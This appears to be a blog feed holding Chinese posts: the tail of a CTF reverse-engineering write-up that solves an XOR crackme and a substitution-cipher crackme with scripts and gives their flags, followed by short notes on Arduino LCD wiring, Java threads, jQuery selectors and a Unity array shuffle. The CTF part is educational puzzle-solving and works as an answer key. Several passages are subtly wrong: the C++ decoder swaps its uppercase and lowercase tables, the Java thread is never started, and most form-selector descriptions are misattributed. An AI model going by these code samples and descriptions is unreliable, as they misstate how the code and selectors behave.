"hang_dian_xin_gong_ctf!!");</span><br><span class="line">  v8 = 16;</span><br><span class="line">  v9 = 6;</span><br><span class="line">  v10 = 13;</span><br><span class="line">  v11 = 19;</span><br><span class="line">  v12 = 57;</span><br><span class="line">  v13 = 31;</span><br><span class="line">  v14 = 61;</span><br><span class="line">  v15 = 9;</span><br><span class="line">  v16 = 7;</span><br><span class="line">  v17 = 44;</span><br><span class="line">  v18 = 39;</span><br><span class="line">  v19 = 0;</span><br><span class="line">  v20 = 29;</span><br><span class="line">  v21 = 0;</span><br><span class="line">  v22 = 2;</span><br><span class="line">  v23 = 14;</span><br><span class="line">  v24 = 29;</span><br><span class="line">  v25 = 30;</span><br><span class="line">  v26 = 0;</span><br><span class="line">  v27 = 27;</span><br><span class="line">  v28 = 27;</span><br><span class="line">  v29 = 20;</span><br><span class="line">  v30 = 0;</span><br><span class="line">  v31 = 92;</span><br><span class="line">  sub_411154("%s", (unsigned int)v6);</span><br><span class="line">  for ( i = 0; i < 24; ++i )</span><br><span class="line">    v7[i] = *(&v8 + i) ^ v6[i];</span><br><span class="line">  for ( j = 0; j < 24; ++j )</span><br><span class="line">  {</span><br><span class="line">    if ( v7[j] != v32[j] )</span><br><span class="line">    {</span><br><span class="line">      sub_41104B("You should try again!\n", v3);</span><br><span class="line">      system("pause");</span><br><span class="line">      ((void (*)(void))sub_41122B)();</span><br><span class="line">      goto LABEL_10;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  sub_41104B("The flag is your input!\n", v3);</span><br><span class="line">  system("pause");</span><br><span class="line">  ((void (*)(void))sub_41122B)();</span><br><span class="line">LABEL_10:</span><br><span class="line">  v1 = v0;</span><br><span class="line">  sub_41124E(&savedregs, &dword_411AE0, 0);</span><br><span class="line">  return sub_41122B((unsigned int)&savedregs ^ v33, v1);</span><br></pre></td></tr></tbody></table></figure></div><h5 id="分析伪代码，我们通过-v7-i-amp-v8-i-v6-i-可知我们输入的数据和v8-v31的数据进行异或，然后存在v7，-amp-v8-i其实是一种数组偏移，然后后面-if-v7-j-v32-j-可知v32和v7进行比较，我们不知道v32是什么东西。"><a href="#分析伪代码，我们通过-v7-i-amp-v8-i-v6-i-可知我们输入的数据和v8-v31的数据进行异或，然后存在v7，-amp-v8-i其实是一种数组偏移，然后后面-if-v7-j-v32-j-可知v32和v7进行比较，我们不知道v32是什么东西。" class="headerlink" title="分析伪代码，我们通过  v7[i] = *(&v8 + i) ^ v6[i];  可知我们输入的数据和v8-v31的数据进行异或，然后存在v7，&v8+i其实是一种数组偏移，然后后面  if ( v7[j] != v32[j] )  可知v32和v7进行比较，我们不知道v32是什么东西。"></a>分析伪代码，我们通过  v7[i] = *(&v8 + i) ^ v6[i];  可知我们输入的数据和v8-v31的数据进行异或，然后存在v7，&v8+i其实是一种数组偏移，然后后面  if ( v7[j] != v32[j] )  可知v32和v7进行比较，我们不知道v32是什么东西。</h5><h5 id="我们可以这样思考，我们输入的字符串和另一个字符串进行异或后然后和再一个字符串进行比较，即-A-XOR-B-C，A是我们输入的，若假设这条式子成立，由于异或的可逆性-正确的A-C-XOR-B"><a href="#我们可以这样思考，我们输入的字符串和另一个字符串进行异或后然后和再一个字符串进行比较，即-A-XOR-B-C，A是我们输入的，若假设这条式子成立，由于异或的可逆性-正确的A-C-XOR-B" class="headerlink" title="我们可以这样思考，我们输入的字符串和另一个字符串进行异或后然后和再一个字符串进行比较，即 A XOR B == C，A是我们输入的，若假设这条式子成立，由于异或的可逆性,正确的A = C XOR B"></a>我们可以这样思考，我们输入的字符串和另一个字符串进行异或后然后和再一个字符串进行比较，即 A XOR B == C，A是我们输入的，若假设这条式子成立，由于异或的可逆性,正确的A = C XOR B</h5><h5 id="现在我们需要找到B，带伪代码的开头我们看到如下代码"><a href="#现在我们需要找到B，带伪代码的开头我们看到如下代码" class="headerlink" title="现在我们需要找到B，带伪代码的开头我们看到如下代码"></a>现在我们需要找到B，带伪代码的开头我们看到如下代码</h5><p><a href="https://i.loli.net/2019/03/26/5c99038c640f5.png" target="_blank" rel="noopener"><img alt="25.png" data-src="https://i.loli.net/2019/03/26/5c99038c640f5.png" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v32 = "hang_dian_xin_gong_ctf!!"</span><br></pre></td></tr></tbody></table></figure></div><h5 id="到这里静态分析完毕"><a href="#到这里静态分析完毕" class="headerlink" title="到这里静态分析完毕"></a>到这里静态分析完毕</h5><h5 id="我们要开始写代码直接算出正确的flag"><a href="#我们要开始写代码直接算出正确的flag" class="headerlink" title="我们要开始写代码直接算出正确的flag"></a>我们要开始写代码直接算出正确的flag</h5><h5 id="这里我使用python语言，大家的编程语言不受限制"><a href="#这里我使用python语言，大家的编程语言不受限制" class="headerlink" title="这里我使用python语言，大家的编程语言不受限制"></a>这里我使用python语言，大家的编程语言不受限制</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">key = [16,6,13,19,57,31,61,9,7,44,39,0,29,0,2,14,29,30,0,27,27,20,0,92]</span><br><span class="line">s = "hang_dian_xin_gong_ctf!!"</span><br><span class="line">temp = ''</span><br><span class="line">for i in range(0,24):</span><br><span class="line">temp += chr(key[i]^ord(s[i]))</span><br><span class="line">print temp</span><br></pre></td></tr></tbody></table></figure></div><h5 id="执行结果如下"><a href="#执行结果如下" class="headerlink" title="执行结果如下"></a>执行结果如下</h5><p><a href="https://i.loli.net/2019/03/26/5c99038c6359f.png" target="_blank" rel="noopener"><img alt="26.png" data-src="https://i.loli.net/2019/03/26/5c99038c6359f.png" class="lazyload"></a></p><p>得到flag: xgctf{This_is_easy_xor!}</p><h4 id="其实用纯OD调试也是可以解出答案的，只需要在-v7-j-v32-j-的时候把v32的变量和”hang-dian-xin-gong-ctf-”从内存中取出然后进行xor运算即可，但是汇编语言代码较多，且较为难懂，这里就不给出纯OD的解法了，但是大家可以尝试一下，这里给出的答案是最容易理解的。"><a href="#其实用纯OD调试也是可以解出答案的，只需要在-v7-j-v32-j-的时候把v32的变量和”hang-dian-xin-gong-ctf-”从内存中取出然后进行xor运算即可，但是汇编语言代码较多，且较为难懂，这里就不给出纯OD的解法了，但是大家可以尝试一下，这里给出的答案是最容易理解的。" class="headerlink" title="其实用纯OD调试也是可以解出答案的，只需要在 v7[j] != v32[j] 的时候把v32的变量和”hang_dian_xin_gong_ctf!!”从内存中取出然后进行xor运算即可，但是汇编语言代码较多，且较为难懂，这里就不给出纯OD的解法了，但是大家可以尝试一下，这里给出的答案是最容易理解的。"></a>其实用纯OD调试也是可以解出答案的，只需要在 v7[j] != v32[j] 的时候把v32的变量和”hang_dian_xin_gong_ctf!!”从内存中取出然后进行xor运算即可，但是汇编语言代码较多，且较为难懂，这里就不给出纯OD的解法了，但是大家可以尝试一下，这里给出的答案是最容易理解的。</h4><h3 id="0x3-多密码表"><a href="#0x3-多密码表" class="headerlink" title="0x3 多密码表"></a>0x3 多密码表</h3><h5 id="根据提示，可能存在几个序列进行调换，很可能会使用取余的方法"><a href="#根据提示，可能存在几个序列进行调换，很可能会使用取余的方法" class="headerlink" title="根据提示，可能存在几个序列进行调换，很可能会使用取余的方法"></a>根据提示，可能存在几个序列进行调换，很可能会使用取余的方法</h5><h5 id="该程序是linux-x64位程序，我们选择用ida-x64-来静态分析代码"><a href="#该程序是linux-x64位程序，我们选择用ida-x64-来静态分析代码" class="headerlink" title="该程序是linux x64位程序，我们选择用ida x64 来静态分析代码"></a>该程序是linux x64位程序，我们选择用ida x64 来静态分析代码</h5><p><a href="https://i.loli.net/2019/03/26/5c99038c79be1.png" target="_blank" rel="noopener"><img alt="27.png" data-src="https://i.loli.net/2019/03/26/5c99038c79be1.png" class="lazyload"></a></p><h5 id="按F5进行反编译"><a href="#按F5进行反编译" class="headerlink" title="按F5进行反编译"></a>按F5进行反编译</h5><p><a href="https://i.loli.net/2019/03/26/5c99038c80698.png" target="_blank" rel="noopener"><img alt="28.png" data-src="https://i.loli.net/2019/03/26/5c99038c80698.png" class="lazyload"></a></p><h5 id="点击v15-v9-然后按r，即可转化为字符串"><a href="#点击v15-v9-然后按r，即可转化为字符串" class="headerlink" title="点击v15-v9 然后按r，即可转化为字符串"></a>点击v15-v9 然后按r，即可转化为字符串</h5><p><a href="https://i.loli.net/2019/03/26/5c99038c71f19.png" target="_blank" rel="noopener"><img alt="29.png" data-src="https://i.loli.net/2019/03/26/5c99038c71f19.png" class="lazyload"></a></p><h5 id="这是一个有规律的序列，因为它不重复且等长"><a href="#这是一个有规律的序列，因为它不重复且等长" class="headerlink" title="这是一个有规律的序列，因为它不重复且等长"></a>这是一个有规律的序列，因为它不重复且等长</h5><h5 id="然后我们分析这一条代码"><a href="#然后我们分析这一条代码" class="headerlink" title="然后我们分析这一条代码"></a>然后我们分析这一条代码</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">for ( j = 0; j <= 18; ++j )</span><br><span class="line">{</span><br><span class="line">  if ( buf[j] <= '@' || buf[j] > 'Z' )</span><br><span class="line">  {</span><br><span class="line">    if ( buf[j] <= '`' || buf[j] > 'z' )</span><br><span class="line">    {</span><br><span class="line">      if ( buf[j] <= '/' || buf[j] > '9' )</span><br><span class="line">      {</span><br><span class="line">        if ( buf[j] == '_' )</span><br><span class="line">          v14[j] = '!';</span><br><span class="line">      }</span><br><span class="line">      else</span><br><span class="line">      {</span><br><span class="line">        v14[j] = *((_BYTE *)&v7 + buf[j] - 48);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    else</span><br><span class="line">    {</span><br><span class="line">      v14[j] = *((_BYTE *)&v20 + buf[j] - 97);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  else</span><br><span class="line">  {</span><br><span class="line">    v14[j] = *((_BYTE *)&v15 + buf[j] - 65);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h5 id="直接看中间-if-buf-j-‘-’-v14-j-‘-’-是将-换为"><a href="#直接看中间-if-buf-j-‘-’-v14-j-‘-’-是将-换为" class="headerlink" title="直接看中间  if ( buf[j] == ‘_’ ) v14[j] = ‘!’;   是将  _  换为  !"></a>直接看中间  if ( buf[j] == ‘_’ ) v14[j] = ‘!’;   是将  _  换为  !</h5><h5 id="我们可以改写它的if语句，但是效果不变，比如"><a href="#我们可以改写它的if语句，但是效果不变，比如" class="headerlink" title="我们可以改写它的if语句，但是效果不变，比如"></a>我们可以改写它的if语句，但是效果不变，比如</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ( buf[j] <= '@' || buf[j] > 'Z' ) else {............}</span><br></pre></td></tr></tbody></table></figure></div><h5 id="可以改写成"><a href="#可以改写成" class="headerlink" title="可以改写成"></a>可以改写成</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(buf[j]>='A' && buf[j] <='Z')</span><br><span class="line">v14[j] = *((_BYTE *)&v15 + buf[j] - 65);</span><br></pre></td></tr></tbody></table></figure></div><h5 id="如法炮制，相信大家看懂了代码的意思"><a href="#如法炮制，相信大家看懂了代码的意思" class="headerlink" title="如法炮制，相信大家看懂了代码的意思"></a>如法炮制，相信大家看懂了代码的意思</h5><h5 id="若这个字符若是大写就在大写的密码表（即-MNBVCXZASDFGHJKLPOIUYQWERT）里，以该字符的ascii-65作为下标读取上述密码表"><a href="#若这个字符若是大写就在大写的密码表（即-MNBVCXZASDFGHJKLPOIUYQWERT）里，以该字符的ascii-65作为下标读取上述密码表" class="headerlink" title="若这个字符若是大写就在大写的密码表（即 MNBVCXZASDFGHJKLPOIUYQWERT）里，以该字符的ascii-65作为下标读取上述密码表"></a>若这个字符若是大写就在大写的密码表（即 MNBVCXZASDFGHJKLPOIUYQWERT）里，以该字符的ascii-65作为下标读取上述密码表</h5><h5 id="若这个字符若是小写就在小写的密码表（即-qeadzcwsxryfhvntgbmlkjuiop）里，以该字符的ascii-97作为下标读取上述密码表"><a href="#若这个字符若是小写就在小写的密码表（即-qeadzcwsxryfhvntgbmlkjuiop）里，以该字符的ascii-97作为下标读取上述密码表" class="headerlink" title="若这个字符若是小写就在小写的密码表（即 qeadzcwsxryfhvntgbmlkjuiop）里，以该字符的ascii-97作为下标读取上述密码表"></a>若这个字符若是小写就在小写的密码表（即 qeadzcwsxryfhvntgbmlkjuiop）里，以该字符的ascii-97作为下标读取上述密码表</h5><h5 id="剩余密码表方法雷同"><a href="#剩余密码表方法雷同" class="headerlink" title="剩余密码表方法雷同"></a>剩余密码表方法雷同</h5><h5 id="那么我们可以自己写个程序，顺着这个思路把-A-Z-a-z-0-9-输入进去，然后按照这个形式，一对一的把-9F-R9k-w3U-tM88W9Od-转化为原文"><a href="#那么我们可以自己写个程序，顺着这个思路把-A-Z-a-z-0-9-输入进去，然后按照这个形式，一对一的把-9F-R9k-w3U-tM88W9Od-转化为原文" class="headerlink" title="那么我们可以自己写个程序，顺着这个思路把 A-Z a-z 0-9 ! 输入进去，然后按照这个形式，一对一的把    9F!R9k!w3U!tM88W9Od   转化为原文"></a>那么我们可以自己写个程序，顺着这个思路把 A-Z a-z 0-9 ! 输入进去，然后按照这个形式，一对一的把    9F!R9k!w3U!tM88W9Od   转化为原文</h5><h5 id="附上我C-程序"><a href="#附上我C-程序" class="headerlink" title="附上我C++程序"></a>附上我C++程序</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include<iostream></iostream></span><br><span class="line">using namespace std;</span><br><span class="line">int main() {</span><br><span class="line">char input[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!";</span><br><span class="line">char table1[] = "qeadzcwsxryfhvntgbmlkjuiop";</span><br><span class="line">char table2[] = "MNBVCXZASDFGHJKLPOIUYQWERT";</span><br><span class="line">char table3[] = "9517384206";</span><br><span class="line">char table4[] = "!";</span><br><span class="line">char txt[63] = "";</span><br><span class="line">for (int i = 0; i < 63;i++) {</span><br><span class="line">if (input[i] >= 'A' && input[i] <= 'Z') {</span><br><span class="line">txt[i] = table1[input[i] - 65];</span><br><span class="line">printf("%c  ----->  %c\n", input[i], txt[i]);</span><br><span class="line">continue;</span><br><span class="line">}</span><br><span class="line">if (input[i] >= 'a' && input[i] <= 'z') {</span><br><span class="line">txt[i] = table2[input[i] - 97];</span><br><span class="line">printf("%c  ----->  %c\n", input[i], txt[i]);</span><br><span class="line">continue;</span><br><span class="line">}</span><br><span class="line">if (input[i] >= '0' && input[i] <= '9') {</span><br><span class="line">txt[i] = table3[input[i] - 48];</span><br><span class="line">printf("%c  ----->  %c\n", input[i], txt[i]);</span><br><span class="line">continue;</span><br><span class="line">}</span><br><span class="line">if (input[i] == '_') {</span><br><span class="line">txt[i] = table4[0];</span><br><span class="line">printf("%c  ----->  %c\n", input[i], txt[i]);</span><br><span class="line">continue;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h5 id="根据上面这个程序我们会得到-输入原文-加密为密文-的密码对应表"><a href="#根据上面这个程序我们会得到-输入原文-加密为密文-的密码对应表" class="headerlink" title="根据上面这个程序我们会得到 输入原文 加密为密文 的密码对应表"></a>根据上面这个程序我们会得到 输入原文 加密为密文 的密码对应表</h5><p><a href="https://i.loli.net/2019/03/26/5c9903f12ed64.png" target="_blank" rel="noopener"><img alt="31.png" data-src="https://i.loli.net/2019/03/26/5c9903f12ed64.png" class="lazyload"></a></p><h5 id="我们根据-密文-9F-R9k-w3U-tM88W9Od-一个个对应关系换成原本"><a href="#我们根据-密文-9F-R9k-w3U-tM88W9Od-一个个对应关系换成原本" class="headerlink" title="我们根据 密文 9F!R9k!w3U!tM88W9Od   一个个对应关系换成原本"></a>我们根据 密文 9F!R9k!w3U!tM88W9Od   一个个对应关系换成原本</h5><h5 id="换完后为-0k-y0U-G4t-Pa55w0rD-，根据题目要求加上xgctf"><a href="#换完后为-0k-y0U-G4t-Pa55w0rD-，根据题目要求加上xgctf" class="headerlink" title="换完后为   0k_y0U_G4t_Pa55w0rD   ，根据题目要求加上xgctf{}"></a>换完后为   0k_y0U_G4t_Pa55w0rD   ，根据题目要求加上xgctf{}</h5><h5 id="我们测试一下"><a href="#我们测试一下" class="headerlink" title="我们测试一下"></a>我们测试一下</h5><p><a href="https://i.loli.net/2019/03/26/5c9903f1397a0.png" target="_blank" rel="noopener"><img alt="32.png" data-src="https://i.loli.net/2019/03/26/5c9903f1397a0.png" class="lazyload"></a></p><h3 id="得到flag-xgctf-0k-y0U-G4t-Pa55w0rD"><a href="#得到flag-xgctf-0k-y0U-G4t-Pa55w0rD" class="headerlink" title="得到flag:   xgctf{0k_y0U_G4t_Pa55w0rD}"></a>得到flag:   xgctf{0k_y0U_G4t_Pa55w0rD}</h3></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arduino-液晶显示</title>
      <link href="/2019/03/16/Arduino-%E6%B6%B2%E6%99%B6%E6%98%BE%E7%A4%BA/"/>
      <url>/2019/03/16/Arduino-%E6%B6%B2%E6%99%B6%E6%98%BE%E7%A4%BA/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="液晶接线"><a href="#液晶接线" class="headerlink" title="液晶接线"></a>液晶接线</h2><p><a href="/2019/03/16/Arduino-%E6%B6%B2%E6%99%B6%E6%98%BE%E7%A4%BA/1.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/03/16/Arduino-%E6%B6%B2%E6%99%B6%E6%98%BE%E7%A4%BA/1.jpg" class="lazyload"></a></p><p>背光：K插VSS，A+插VDD<br>电位器三个都要都要插上，电位器左插5V，中插VO，右插K</p><p>D3-D7 对应引脚 2-5</p><p>Hello World输出测试</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include<liquidcrystal.h></liquidcrystal.h></span><br><span class="line">LiquidCrystal lcd(12,11,5,4,3,2);</span><br><span class="line">void setup() {</span><br><span class="line">  lcd.print("Hello World!");</span><br><span class="line">}</span><br><span class="line">void loop() {</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> Arduino </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arduino </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java-Thread详解</title>
      <link href="/2019/03/09/Java-Thread%E8%AF%A6%E8%A7%A3/"/>
      <url>/2019/03/09/Java-Thread%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="首先我们先来创建一个线程"><a href="#首先我们先来创建一个线程" class="headerlink" title="首先我们先来创建一个线程"></a>首先我们先来创建一个线程</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String args[]){</span><br><span class="line">new Thread(){</span><br><span class="line">@Override</span><br><span class="line">public void run(){</span><br><span class="line">super.run();</span><br><span class="line">System.out.println("Success");</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sueccess</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS-选择器</title>
      <link href="/2019/03/08/CSS-%E9%80%89%E6%8B%A9%E5%99%A8/"/>
      <url>/2019/03/08/CSS-%E9%80%89%E6%8B%A9%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="基本过滤选择器"><a href="#基本过滤选择器" class="headerlink" title="基本过滤选择器"></a>基本过滤选择器</h1><style> p:nth-child(odd){    background:#ff0000;}p:nth-child(even){    background:#0000ff;}</style><h2 id="odd-表示奇数，也可以使用2n-1表示"><a href="#odd-表示奇数，也可以使用2n-1表示" class="headerlink" title="odd 表示奇数，也可以使用2n+1表示"></a>odd 表示奇数，也可以使用2n+1表示</h2><h2 id="even-表示偶数，也可以使用2n表示"><a href="#even-表示偶数，也可以使用2n表示" class="headerlink" title="even 表示偶数，也可以使用2n表示"></a>even 表示偶数，也可以使用2n表示</h2><p>下面给出所有的基本过滤选择器</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">:first  描述：选取第一个元素  返回值：单个元素</span><br><span class="line">:last   描述：选取最后一个元素  返回值：单个元素</span><br><span class="line">:not(selector)  描述：选取去除所有与给定选择器匹配的元素  返回值：集合元素</span><br><span class="line">:even  描述：选取索引是偶数的所有元素(index从0开始)  返回值：集合元素</span><br><span class="line">:odd  描述：选取索引是奇数的所有元素(index从0开始)  返回值：单个元素</span><br><span class="line">:eq(index)  描述：选取索引等于index的元素(index从0开始)  返回值：集合元素</span><br><span class="line">:gt(index)  描述：选取索引大于index的元素(index从0开始)  返回值：集合元素</span><br><span class="line">:lt(index)  描述：选取索引小于index的元素(index从0开始)  返回值：集合元素</span><br><span class="line">:header  描述：选取所有标题元素  返回值：集合元素</span><br><span class="line">:focus  描述：选取当前获取焦点的元素  返回值：集合元素</span><br><span class="line">:empty 可以选中空的，比如空的<div><br><span class="line">:parent 选取不为空的元素</span><br><span class="line">:has(class or 元素) 选取含有参数的元素</span><br><span class="line">div[id] 表示选中有标记id的div</span><br><span class="line">div[class = 'aaa'] == div.aaa</span><br><span class="line">div[class != 'aaa'] 获取class不为aaa的div元素</span><br><span class="line">div[class $= 'b'] 获取class以b结尾的元素,div可为其他元素</span><br></div></span></pre></td></tr></tbody></table></figure></div><p>#表单选择器<br>    ## 基本表单选择器</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">:input 选取所有input、textarea、select和button元素</span><br><span class="line">:text 选择所有单行文本框，即 type = text</span><br><span class="line">:button 选择所有普通按钮，即 type = password</span><br><span class="line">:submit 选取所有提交按钮，即 type = radio</span><br><span class="line">:radio 选择所有单选框，即 type=checkbox</span><br><span class="line">:checkbox 选择所有复选框，</span><br><span class="line">:reset 选取所有重置按钮</span><br><span class="line">:image 选择所有普通按钮</span><br><span class="line">:file 选择所有文件按钮</span><br><span class="line">:hidden 选择所有不可见字段</span><br></pre></td></tr></tbody></table></figure></div><h2 id="高级表单选择器（表单过滤选择器）"><a href="#高级表单选择器（表单过滤选择器）" class="headerlink" title="高级表单选择器（表单过滤选择器）"></a>高级表单选择器（表单过滤选择器）</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">:enabled 选取所有可用元素</span><br><span class="line">:disabled 选取所有不可用元素</span><br><span class="line">:checked 选取所有被选中的元素。单选和复选字段</span><br><span class="line">:selected 选取所有被选中的元素，下拉列表</span><br></pre></td></tr></tbody></table></figure></div><p>#</p></body></html>]]></content>
      
      
      <categories>
          
          <category> HTML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unity3D-打乱数组</title>
      <link href="/2019/03/07/Unity3D-%E6%89%93%E4%B9%B1%E6%95%B0%E7%BB%84/"/>
      <url>/2019/03/07/Unity3D-%E6%89%93%E4%B9%B1%E6%95%B0%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="Unity3D-一维数组打乱"><a href="#Unity3D-一维数组打乱" class="headerlink" title="Unity3D 一维数组打乱"></a>Unity3D 一维数组打乱</h2><p>###<br>我们可以使用Random随机生成数字对原数组进行交换</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int position1 = Random.Range(listMin,listMax);</span><br><span class="line">int position2 = Random.Range(listMin,listMax);</span><br><span class="line">while(position2 == 